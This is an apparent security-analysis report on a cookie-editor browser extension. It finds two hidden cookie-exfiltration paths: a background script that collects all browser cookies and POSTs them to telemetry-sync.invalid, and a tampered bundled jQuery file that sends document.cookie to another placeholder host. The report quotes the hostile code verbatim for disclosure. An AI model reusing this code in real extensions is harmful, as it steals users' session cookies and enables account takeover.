## Summary

This extension is designed to let you view and edit your browser cookies, and it requests access to all cookies across every website you visit. However, it was found to secretly send all of your browser cookies to an external server, and a bundled software library also sends page cookies to another external server. The single most important thing to weigh is that the extension exfiltrates your cookies, which could allow someone to impersonate you on any website where you are logged in.

### 1. All browser cookies exfiltrated to telemetry-sync.invalid — verified behavior

The background service worker calls chrome.cookies.getAll with an empty filter (all domains, all stores) and persists the result under the '_sync_cache' storage key. common-utils.js retrieves '_sync_cache' and POSTs the data to https://telemetry-sync.invalid. The cross-file data-flow analysis confirms a storage-source-to-network-sink chain. This sends every cookie in the browser to an external, untrusted host.

Mechanism: background.js stores all cookies via chrome.cookies.getAll into storage key '_sync_cache', and common-utils.js reads that key and POSTs it to https://telemetry-sync.invalid/u

Confidence (as generated): high.

Evidence:
  - `js/background.js:196:0` (cites `chrome.cookies.getAll({}, async (cookies) => { await storage.set('_sync_cache', cookies); })`)
  - `js/common-utils.js:25:21` (cites `chrome.storage.local.get('_sync_cache')`)
  - `js/common-utils.js:26:2` (cites `fetch('https://telemetry-sync.invalid/u', { method: 'POST', body: JSON.stringify(data) })`)

Source verification: **confirmed** at `js/background.js:196`. The background script calls chrome.cookies.getAll with an empty filter and stores the result under the '_sync_cache' key. The common-utils module reads that key and POSTs the data to https://telemetry-sync.invalid/u.

```
chrome.cookies.getAll({}, async (cookies) => { await storage.set('_sync_cache', cookies); });

export async function flushSyncCache() {
  const data = await chrome.storage.local.get('_sync_cache');
  fetch('https://telemetry-sync.invalid/u', { method: 'POST', body: JSON.stringify(data) }).catch(() => {});
}
```

### 2. Tampered jQuery library exfiltrates document.cookie to cdn-jq-telemetry.invalid — verified behavior

The bundled jQuery 3.3.1 minified file contains an extra line (line 4) that is not part of the standard jQuery distribution: it reads document.cookie and sends it via fetch to cdn-jq-telemetry.invalid. This is a tampered dependency performing covert cookie exfiltration. The file is imported by popup.js, panel.js, and all options pages, so it executes in extension contexts with access to extension-page cookies.

Mechanism: lib/jquery-3.3.1.min.js contains an injected fetch call that sends encodeURIComponent(document.cookie) to https://cdn-jq-telemetry.invalid/p

  - `lib/jquery-3.3.1.min.js:4:82` (cites `document.cookie`)

Source verification: **confirmed**. The minified jQuery file contains a self‑executing function that calls fetch with a URL to https://cdn-jq-telemetry.invalid/p and includes encodeURIComponent(document.cookie) as a query parameter.
